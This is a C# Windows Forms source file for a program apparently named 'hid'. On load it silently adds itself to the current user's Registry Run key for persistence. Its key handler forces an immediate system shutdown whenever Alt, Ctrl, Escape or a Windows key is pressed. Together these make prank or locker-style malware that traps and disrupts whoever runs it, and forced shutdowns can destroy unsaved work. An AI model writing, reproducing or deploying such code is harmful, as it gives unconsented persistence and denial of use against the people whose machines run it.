using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Management;
using Microsoft.Win32;
using System.Runtime.InteropServices;

namespace hid
{
    public partial class Form3 : Form
    {
        [DllImport("user32.dll")]
        private static extern bool SetForegroundWindow(IntPtr hWnd);
        [DllImport("user32.dll")]
        private static extern int FindWindow(string className, string windowText);




        [DllImport("user32.dll")]

        private static extern int ShowWindow(int hwnd, int command);


        private const int SW_HIDE = 0;

        private const int SW_SHOW = 1;
        
        int zaman = 12;
        public Form3()
        {
            InitializeComponent();
        }

        private void Form3_Load(object sender, EventArgs e)
        {

            Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true).SetValue("hid", "\"" + Application.ExecutablePath + "\"");                      
            
            Random rs = new Random();
            textBox1.Text = (rs.Next(1, 5).ToString());
            if (textBox1.Text == "1")
                label1.Visible = true;
            if (textBox1.Text == "2")
                label2.Visible = true;
            if (textBox1.Text == "3")
                label3.Visible = true;
            if (textBox1.Text == "4")
                label4.Visible = true;
            if (textBox1.Text == "5")
                label5.Visible = true;
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            zaman--;
            if ( zaman == 0)
            {
                timer1.Enabled = false;
                Form1 f1 = new Form1();
                this.Hide();
                f1.Show();
            }
        }

        private void Form3_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Alt)
                System.Diagnostics.Process.Start("shutdown", "-f -s -t 0");
            e.Handled = true;
            if (e.Control)
                System.Diagnostics.Process.Start("shutdown", "-f -s -t 0");
            e.Handled = true;
            if (e.KeyCode == Keys.LWin)
                System.Diagnostics.Process.Start("Shutdown", " -f -s -t 0");
            if (e.KeyCode == Keys.RWin)
                System.Diagnostics.Process.Start("Shutdown", " -f -s -t 0");
            e.Handled = true;
            if (e.KeyCode == Keys.Escape)
                System.Diagnostics.Process.Start("Shutdown", "-f -s -t 0");
            e.Handled = true;
        }
    }
}
